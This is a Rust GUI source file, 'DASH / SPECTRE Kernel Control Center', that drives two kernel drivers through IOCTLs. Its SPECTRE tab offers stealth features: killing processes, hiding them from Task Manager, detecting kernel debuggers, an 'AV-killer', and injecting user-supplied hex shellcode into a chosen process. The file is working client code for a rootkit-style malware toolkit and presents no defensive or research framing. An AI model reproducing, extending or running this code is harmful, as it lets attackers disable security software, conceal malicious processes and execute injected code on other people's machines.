#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

use std::collections::BTreeMap;
use std::ptr;

use eframe::egui;

use windows_sys::Win32::Foundation::{CloseHandle, HANDLE, INVALID_HANDLE_VALUE};
use windows_sys::Win32::Storage::FileSystem::{
    CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_READ, FILE_GENERIC_WRITE, FILE_SHARE_READ,
    FILE_SHARE_WRITE, OPEN_EXISTING,
};
use windows_sys::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS,
};
use windows_sys::Win32::System::IO::DeviceIoControl;

// ============================================================
// Device paths
// ============================================================
const DASH_DEVICE: &[u16] = &[
    '\\' as u16, '\\' as u16, '.' as u16, '\\' as u16,
    'D' as u16, 'A' as u16, 'S' as u16, 'H' as u16,
    'D' as u16, 'r' as u16, 'i' as u16, 'v' as u16,
    'e' as u16, 'r' as u16, 0u16,
];
const SPECTRE_DEVICE: &[u16] = &[
    '\\' as u16, '\\' as u16, '.' as u16, '\\' as u16,
    'S' as u16, 'P' as u16, 'E' as u16, 'C' as u16,
    'T' as u16, 'R' as u16, 'E' as u16, 'D' as u16,
    'r' as u16, 'v' as u16, 0u16,
];

// DASH IOCTLs
const IOCTL_ADD_BLACKLIST: u32       = 0x800;
const IOCTL_REMOVE_BLACKLIST: u32    = 0x801;
const IOCTL_CLEAR_BLACKLIST: u32     = 0x802;
const IOCTL_LIST_BLACKLIST: u32      = 0x803;
const IOCTL_GET_BLACKLIST_COUNT: u32 = 0x804;

// SPECTRE IOCTLs
const IOCTL_KILL_PROCESS: u32     = 0x900;
const IOCTL_HIDE_PROCESS: u32     = 0x901;
const IOCTL_UNHIDE_PROCESS: u32   = 0x902;
const IOCTL_CHECK_DEBUGGER: u32   = 0x903;
const IOCTL_INJECT_SHELLCODE: u32 = 0x904;
const IOCTL_KILL_AV: u32          = 0x905;

// ============================================================
// Low-level driver access
// ============================================================
fn open_device(path: &[u16]) -> Option<HANDLE> {
    unsafe {
        let handle = CreateFileW(
            path.as_ptr(),
            FILE_GENERIC_READ | FILE_GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            ptr::null(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            0,
        );
        if handle == INVALID_HANDLE_VALUE {
            None
        } else {
            Some(handle)
        }
    }
}

fn ioctl_buffered(
    handle: HANDLE,
    code: u32,
    input: &[u8],
    output: &mut [u8],
) -> Option<u32> {
    let mut returned: u32 = 0;
    let ok = unsafe {
        DeviceIoControl(
            handle,
            code,
            if input.is_empty() { ptr::null() } else { input.as_ptr() as *const _ },
            input.len() as u32,
            if output.is_empty() { ptr::null_mut() } else { output.as_mut_ptr() as *mut _ },
            output.len() as u32,
            &mut returned,
            ptr::null_mut(),
        ) != 0
    };
    if ok { Some(returned) } else { None }
}

// ============================================================
// Process enumeration (Toolhelp)
// ============================================================
fn enum_processes() -> Vec<(u32, String)> {
    let mut out = Vec::new();
    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap == INVALID_HANDLE_VALUE {
            return out;
        }
        let mut entry: PROCESSENTRY32W = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
        if Process32FirstW(snap, &mut entry) != 0 {
            loop {
                let name = String::from_utf16_lossy(
                    &entry.szExeFile[..entry.szExeFile.iter().take_while(|&&c| c != 0).count()],
                );
                out.push((entry.th32ProcessID, name));
                if Process32NextW(snap, &mut entry) == 0 {
                    break;
                }
            }
        }
        CloseHandle(snap);
    }
    out
}

// ============================================================
// Application state
// ============================================================
#[derive(Default)]
struct LogBuffer {
    lines: Vec<String>,
}

impl LogBuffer {
    fn push(&mut self, s: impl Into<String>) {
        self.lines.insert(0, s.into());
        self.lines.truncate(200);
    }
}

struct DashApp {
    // connection state
    dash_connected: bool,
    spectre_connected: bool,

    // dash tab
    blacklist: Vec<String>,
    add_name: String,
    remove_name: String,
    log: LogBuffer,

    // spectre tab
    processes: Vec<(u32, String)>,
    filter: String,
    selected_pid: Option<u32>,
    kill_target: String,
    hide_target: String,
    unhide_target: String,
    shellcode_hex: String,
    inject_target: String,

    // demo mode
    demo: bool,

    // current tab (0 = DASH, 1 = SPECTRE)
    tab: usize,
}

impl DashApp {
    fn new(demo: bool) -> Self {
        Self {
            demo,
            dash_connected: open_device(DASH_DEVICE).is_some(),
            spectre_connected: open_device(SPECTRE_DEVICE).is_some(),
            blacklist: Vec::new(),
            add_name: String::new(),
            remove_name: String::new(),
            log: LogBuffer::default(),
            processes: enum_processes(),
            filter: String::new(),
            selected_pid: None,
            kill_target: String::new(),
            hide_target: String::new(),
            unhide_target: String::new(),
            shellcode_hex: String::new(),
            inject_target: String::new(),
            tab: 0,
        }
    }

    fn status_line(&self, name: &str, connected: bool) -> String {
        if self.demo {
            format!("{}: DEMO MODE (simulated)", name)
        } else if connected {
            format!("{}: CONNECTED", name)
        } else {
            format!("{}: NOT LOADED", name)
        }
    }

    // ---- DASH actions ----
    fn dash_add(&mut self) {
        let name = self.add_name.trim().to_string();
        if name.is_empty() { return; }
        if self.demo {
            self.blacklist.push(name.clone());
            self.log.push(format!("[+] Added: {}", name));
            self.add_name.clear();
            return;
        }
        if let Some(h) = open_device(DASH_DEVICE) {
            let mut buf = [0u8; 256];
            let bytes = name.as_bytes();
            let len = bytes.len().min(255);
            buf[..len].copy_from_slice(&bytes[..len]);
            buf[len] = 0;
            let ok = ioctl_buffered(h, IOCTL_ADD_BLACKLIST, &buf[..len + 1], &mut []).is_some();
            unsafe { CloseHandle(h) };
            if ok {
                self.blacklist.push(name.clone());
                self.log.push(format!("[+] Added: {}", name));
            } else {
                self.log.push(format!("[-] Failed to add: {} (duplicate or list full)", name));
            }
            self.add_name.clear();
        } else {
            self.log.push("[-] DASH driver not loaded".to_string());
        }
    }

    fn dash_remove(&mut self) {
        let name = self.remove_name.trim().to_string();
        if name.is_empty() { return; }
        if self.demo {
            self.blacklist.retain(|x| x != &name);
            self.log.push(format!("[-] Removed: {}", name));
            self.remove_name.clear();
            return;
        }
        if let Some(h) = open_device(DASH_DEVICE) {
            let mut buf = [0u8; 256];
            let bytes = name.as_bytes();
            let len = bytes.len().min(255);
            buf[..len].copy_from_slice(&bytes[..len]);
            buf[len] = 0;
            let ok = ioctl_buffered(h, IOCTL_REMOVE_BLACKLIST, &buf[..len + 1], &mut []).is_some();
            unsafe { CloseHandle(h) };
            if ok {
                self.blacklist.retain(|x| x != &name);
                self.log.push(format!("[-] Removed: {}", name));
            } else {
                self.log.push(format!("[-] Not found in blacklist: {}", name));
            }
            self.remove_name.clear();
        } else {
            self.log.push("[-] DASH driver not loaded".to_string());
        }
    }

    fn dash_clear(&mut self) {
        if self.demo {
            self.blacklist.clear();
            self.log.push("[*] Blacklist cleared".to_string());
            return;
        }
        if let Some(h) = open_device(DASH_DEVICE) {
            let ok = ioctl_buffered(h, IOCTL_CLEAR_BLACKLIST, &[], &mut []).is_some();
            unsafe { CloseHandle(h) };
            if ok {
                self.blacklist.clear();
                self.log.push("[*] Blacklist cleared".to_string());
            } else {
                self.log.push("[-] Failed to clear".to_string());
            }
        }
    }

    fn dash_refresh(&mut self) {
        if self.demo { return; }
        if let Some(h) = open_device(DASH_DEVICE) {
            let mut out = vec![0u8; 8192];
            let returned = ioctl_buffered(h, IOCTL_LIST_BLACKLIST, &[], &mut out);
            unsafe { CloseHandle(h) };
            let mut list = Vec::new();
            if let Some(n) = returned {
                let mut offset = 0usize;
                while offset < n as usize {
                    let s = &out[offset..];
                    if let Some(end) = s.iter().position(|&b| b == 0) {
                        list.push(String::from_utf8_lossy(&s[..end]).to_string());
                        offset += end + 1;
                    } else { break; }
                }
            }
            self.blacklist = list;
            self.log.push(format!("[*] Blacklist refreshed ({} entries)", self.blacklist.len()));
        } else {
            self.log.push("[-] DASH driver not loaded".to_string());
        }
    }

    // ---- SPECTRE actions ----
    fn send_pid(&mut self, ioctl: u32, pid_str: &str, action: &str) {
        let pid: u32 = match pid_str.trim().parse() {
            Ok(p) => p,
            Err(_) => {
                self.log.push(format!("[-] Invalid PID: '{}'", pid_str));
                return;
            }
        };
        if self.demo {
            self.log.push(format!("[+] {} PID {} (simulated)", action, pid));
            return;
        }
        if let Some(h) = open_device(SPECTRE_DEVICE) {
            let v = pid as u64;
            let ok = ioctl_buffered(h, ioctl, &v.to_le_bytes(), &mut []).is_some();
            unsafe { CloseHandle(h) };
            if ok {
                self.log.push(format!("[+] {} PID {}", action, pid));
            } else {
                self.log.push(format!("[-] Failed to {} PID {} (invalid PID or driver error)", action.to_lowercase(), pid));
            }
        } else {
            self.log.push("[-] SPECTRE driver not loaded".to_string());
        }
    }

    fn spectre_check_debugger(&mut self) {
        if self.demo {
            self.log.push("[*] No kernel debugger detected. (simulated)".to_string());
            return;
        }
        if let Some(h) = open_device(SPECTRE_DEVICE) {
            let mut out = [0u8; 1];
            let ok = ioctl_buffered(h, IOCTL_CHECK_DEBUGGER, &[], &mut out);
            unsafe { CloseHandle(h) };
            match ok {
                Some(_) if out[0] != 0 => self.log.push("[!] Kernel debugger DETECTED!".to_string()),
                _ => self.log.push("[*] No kernel debugger detected.".to_string()),
            }
        } else {
            self.log.push("[-] SPECTRE driver not loaded".to_string());
        }
    }

    fn spectre_inject(&mut self) {
        let pid: u32 = match self.inject_target.trim().parse() {
            Ok(p) => p,
            Err(_) => {
                self.log.push(format!("[-] Invalid PID: '{}'", self.inject_target));
                return;
            }
        };
        let clean: String = self.shellcode_hex.chars().filter(|c| !c.is_whitespace()).collect();
        let mut bytes = Vec::new();
        if clean.len() % 2 == 0 {
            let chars: Vec<char> = clean.chars().collect();
            for i in (0..chars.len()).step_by(2) {
                if let Ok(b) = u8::from_str_radix(&format!("{}{}", chars[i], chars[i + 1]), 16) {
                    bytes.push(b);
                } else {
                    self.log.push("[-] Invalid hex in shellcode".to_string());
                    return;
                }
            }
        } else {
            self.log.push("[-] Shellcode hex must have even length".to_string());
            return;
        }
        if bytes.is_empty() {
            self.log.push("[-] Empty shellcode".to_string());
            return;
        }
        if self.demo {
            self.log.push(format!("[+] Injected {} bytes into PID {} (simulated)", bytes.len(), pid));
            return;
        }
        if let Some(h) = open_device(SPECTRE_DEVICE) {
            let mut buf = Vec::with_capacity(8 + bytes.len());
            buf.extend_from_slice(&(pid as u64).to_le_bytes());
            buf.extend_from_slice(&bytes);
            let ok = ioctl_buffered(h, IOCTL_INJECT_SHELLCODE, &buf, &mut []).is_some();
            unsafe { CloseHandle(h) };
            if ok {
                self.log.push(format!("[+] Injected {} bytes into PID {}", bytes.len(), pid));
            } else {
                self.log.push(format!("[-] Inject failed for PID {}", pid));
            }
        } else {
            self.log.push("[-] SPECTRE driver not loaded".to_string());
        }
    }

    fn spectre_kill_av(&mut self) {
        if self.demo {
            self.log.push("[+] AV-killer activated (simulated)".to_string());
            return;
        }
        if let Some(h) = open_device(SPECTRE_DEVICE) {
            let ok = ioctl_buffered(h, IOCTL_KILL_AV, &[], &mut []).is_some();
            unsafe { CloseHandle(h) };
            if ok {
                self.log.push("[+] AV-killer activated".to_string());
            } else {
                self.log.push("[-] Failed to activate AV-killer".to_string());
            }
        }
    }
}

impl eframe::App for DashApp {
    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
        egui::TopBottomPanel::top("header").show(ctx, |ui| {
            ui.horizontal(|ui| {
                ui.heading("🛡️ DASH / SPECTRE — Kernel Control Center");
                ui.separator();
                ui.label(egui::RichText::new(self.status_line("DASH", self.dash_connected)).color(
                    if self.demo || self.dash_connected { egui::Color32::LIGHT_GREEN } else { egui::Color32::RED },
                ));
                ui.label(egui::RichText::new(self.status_line("SPECTRE", self.spectre_connected)).color(
                    if self.demo || self.spectre_connected { egui::Color32::LIGHT_GREEN } else { egui::Color32::RED },
                ));
            });
        });

        egui::TopBottomPanel::bottom("log").resizable(true).default_height(160.0).show(ctx, |ui| {
            ui.heading("📜 Kernel Log");
            egui::ScrollArea::vertical().stick_to_bottom(false).show(ui, |ui| {
                for line in &self.log.lines {
                    let colored = if line.starts_with("[+]") {
                        egui::RichText::new(line).color(egui::Color32::LIGHT_GREEN)
                    } else if line.starts_with("[-]") || line.starts_with("[!]") {
                        egui::RichText::new(line).color(egui::Color32::LIGHT_RED)
                    } else {
                        egui::RichText::new(line).color(egui::Color32::LIGHT_YELLOW)
                    };
                    ui.label(colored);
                }
            });
        });

        egui::SidePanel::left("processes").resizable(true).default_width(320.0).show(ctx, |ui| {
            ui.heading("🖥️ Processes");
            ui.horizontal(|ui| {
                ui.label("Filter:");
                ui.text_edit_singleline(&mut self.filter);
                if ui.button("🔄").on_hover_text("Refresh").clicked() {
                    self.processes = enum_processes();
                }
            });
            egui::ScrollArea::vertical().show(ui, |ui| {
                let flt = self.filter.to_lowercase();
                for (pid, name) in &self.processes {
                    if !flt.is_empty() && !name.to_lowercase().contains(&flt) {
                        continue;
                    }
                    let label = format!("{}  [{}]", name, pid);
                    if ui.selectable_label(self.selected_pid == Some(*pid), label).clicked() {
                        self.selected_pid = Some(*pid);
                        self.kill_target = pid.to_string();
                        self.hide_target = pid.to_string();
                        self.unhide_target = pid.to_string();
                        self.inject_target = pid.to_string();
                    }
                }
            });
        });

        egui::CentralPanel::default().show(ctx, |ui| {
            ui.heading("🎛️ Control");
            ui.separator();
            ui.horizontal(|ui| {
                if ui.selectable_label(self.tab == 0, "📋 DASH — Process Blocker").clicked() {
                    self.tab = 0;
                }
                if ui.selectable_label(self.tab == 1, "👻 SPECTRE — Stealth").clicked() {
                    self.tab = 1;
                }
            });
            ui.separator();

            if self.tab == 0 {
                // ---- DASH TAB ----
                ui.heading("🚫 DASH — Dynamic Blacklist");
                ui.horizontal(|ui| {
                    ui.label("Process:");
                    ui.text_edit_singleline(&mut self.add_name);
                    if ui.button("➕ Add to blacklist").clicked() {
                        self.dash_add();
                    }
                });
                ui.horizontal(|ui| {
                    ui.label("Remove:");
                    ui.text_edit_singleline(&mut self.remove_name);
                    if ui.button("➖ Remove").clicked() {
                        self.dash_remove();
                    }
                });
                ui.horizontal(|ui| {
                    if ui.button("🗑️ Clear all").clicked() {
                        self.dash_clear();
                    }
                    if ui.button("🔄 Refresh list").clicked() {
                        self.dash_refresh();
                    }
                });
                ui.separator();
                ui.label(format!("Blacklist ({} entries):", self.blacklist.len()));
                egui::ScrollArea::vertical().max_height(200.0).show(ui, |ui| {
                    let items: Vec<String> = self.blacklist.clone();
                    for name in &items {
                        ui.horizontal(|ui| {
                            ui.label(format!("🚫 {}", name));
                            if ui.small_button("remove").clicked() {
                                self.remove_name = name.clone();
                                self.dash_remove();
                            }
                        });
                    }
                });
            } else {
                // ---- SPECTRE TAB ----
                ui.heading("👻 SPECTRE — Stealth Operations");
                ui.horizontal(|ui| {
                    ui.label("PID:");
                    ui.text_edit_singleline(&mut self.kill_target);
                    if ui.button("🗡️ Kill").clicked() {
                        let t = self.kill_target.clone();
                        self.send_pid(IOCTL_KILL_PROCESS, &t, "Killed");
                    }
                });
                ui.horizontal(|ui| {
                    ui.label("PID:");
                    ui.text_edit_singleline(&mut self.hide_target);
                    if ui.button("🙈 Hide from Task Manager").clicked() {
                        let t = self.hide_target.clone();
                        self.send_pid(IOCTL_HIDE_PROCESS, &t, "Hidden");
                    }
                });
                ui.horizontal(|ui| {
                    ui.label("PID:");
                    ui.text_edit_singleline(&mut self.unhide_target);
                    if ui.button("👁️ Unhide").clicked() {
                        let t = self.unhide_target.clone();
                        self.send_pid(IOCTL_UNHIDE_PROCESS, &t, "Unhidden");
                    }
                });
                ui.separator();
                ui.horizontal(|ui| {
                    if ui.button("🕵️ Check debugger").clicked() {
                        self.spectre_check_debugger();
                    }
                    if ui.button("🛡️ Activate AV-killer").clicked() {
                        self.spectre_kill_av();
                    }
                });
                ui.separator();
                ui.label("💉 Inject shellcode:");
                ui.horizontal(|ui| {
                    ui.label("PID:");
                    ui.text_edit_singleline(&mut self.inject_target);
                });
                ui.text_edit_multiline(&mut self.shellcode_hex);
                if ui.button("🚀 Inject").clicked() {
                    self.spectre_inject();
                }
            }
        });
    }
}

fn main() -> Result<(), eframe::Error> {
    let demo = std::env::args().any(|a| a == "--demo" || a == "-d");
    let options = eframe::NativeOptions {
        viewport: egui::ViewportBuilder::default().with_inner_size([1100.0, 700.0]),
        ..Default::default()
    };
    eframe::run_native(
        "DASH / SPECTRE Control Center",
        options,
        Box::new(move |_cc| Ok(Box::new(DashApp::new(demo)))),
    )
}
